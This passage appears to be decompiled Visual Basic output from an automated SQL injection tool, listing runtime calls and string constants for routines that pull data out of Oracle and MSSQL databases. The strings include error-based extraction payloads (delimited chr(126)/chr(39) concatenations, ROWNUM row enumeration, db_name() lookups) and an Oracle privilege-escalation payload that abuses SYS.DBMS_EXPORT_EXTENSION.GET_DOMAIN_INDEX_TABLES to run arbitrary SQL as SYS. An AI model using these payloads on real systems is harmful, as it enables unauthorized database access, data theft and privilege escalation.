'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarAdd
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'End Sub
 
'Sub Subr_722()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCat
'N  * ref: IIf(
'N  * ref: "(select chr(126)||chr(39)||"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "||chr(39)||chr(126) from (select ROWNUM r, "
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: " from "
'N  * ref: __vbaStrMove
'N  * ref: " order BY "
'N  * ref: ") where r="
'N  * ref: ")"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "~'([\s\S]*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: "~'(.*?)'~"
'N  * ref: "~'([\s\S]*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: Subr_188
'N  * ref: "Data Found: "
'N  * ref: __vbaStrMove
'N  * ref: "="
'N  * ref: Subr_143
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCopy
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_723()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCat
'N  * ref: " where "
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "(select chr(126)||chr(39)||cast(Count("
'N  * ref: __vbaStrMove
'N  * ref: ") as char(10))||chr(39)||chr(126) from "
'N  * ref: ")"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaStrVarVal
'N  * ref: Val(
'N  * ref: __vbaFpI4
'N  * ref: __vbaFreeStr
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "Count("
'N  * ref: ") of "
'N  * ref: " is "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: " where "
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "Can not get Count("
'N  * ref: ") of "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_724()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCopy
'N  * ref: Trim(
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "select"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: __vbaVarCopy
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaStrCat
'N  * ref: "(chr(126)||chr(39)||("
'N  * ref: ")||chr(39)||chr(126))"
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "~'([\s\S]*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: "~'(.*?)'~"
'N  * ref: "~'([\s\S]*?)'~"
'N  * ref: Subr_165
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: "Query result: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: "FOO"
'N  * ref: Subr_718
'N  * ref: "BAR"
'N  * ref: Subr_718
'N  * ref: "DBMS_OUTPUT" & """" & ".PUT(:P1);EXECUTE IMMEDIATE 'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "'';END;';END;--"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: Subr_718
'N  * ref: "SYS"
'N  * ref: Subr_718
'N  * ref: "1"
'N  * ref: Subr_718
'N  * ref: " or chr(42)=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES("
'N  * ref: ","
'N  * ref: __vbaVarCat
'N  * ref: ",0,"
'N  * ref: ",0)--"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaVarCat
'N  * ref: " or chr(42)=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" & """" & ".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''"
'N  * ref: "'''';END;'';END;--','SYS',0,'1',0)--"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaInStr
'N  * ref: "Query was done"
'N  * ref: __vbaVarCopy
'N  * ref: "Query failed! (maybe its done?! check it yourself)"
'N  * ref: __vbaVarCopy
'N  * ref: Subr_143
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_725()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaLenBstr
'N  * ref: "NULL"
'N  * ref: __vbaVarCopy
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCat
'N  * ref: __vbaI4Var
'N  * ref: "char("
'N  * ref: Mid(
'N  * ref: __vbaStrVarVal
'N  * ref: Asc(
'N  * ref: ")%2b"
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: Left(
'N  * ref: __vbaStrCat
'N  * ref: "'"
'N  * ref: __vbaStrMove
'N  * ref: "'"
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_726()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrCat
'N  * ref: "char(126)%2bchar(39)%2b("
'N  * ref: "db_name()"
'N  * ref: __vbaStrMove
'N  * ref: ")%2bchar(39)%2bchar(126)"
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "null"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCat
'N  * ref: "char(126)%2bchar(39)%2b("
'N  * ref: "db_name()"
'N  * ref: __vbaStrMove
'N  * ref: ")%2bchar(39)%2bchar(126)"
'N  * ref: Subr_153
'N  * ref: Subr_155
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: "DB Name: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Current DB: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarCopy
'N  * ref: Subr_169
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstEq
'N  * ref: "Cannot get current db name!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_727()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCat
'N  * ref: "char(126)%2bchar(39)%2b("
'N  * ref: "db_name("
'N  * ref: ")"
'N  * ref: ")%2bchar(39)%2bchar(126)"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: "Data Base Found: "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: vbTab
'N  * ref: __vbaVarDup
'N  * ref: "Data Bases: "
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_169
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
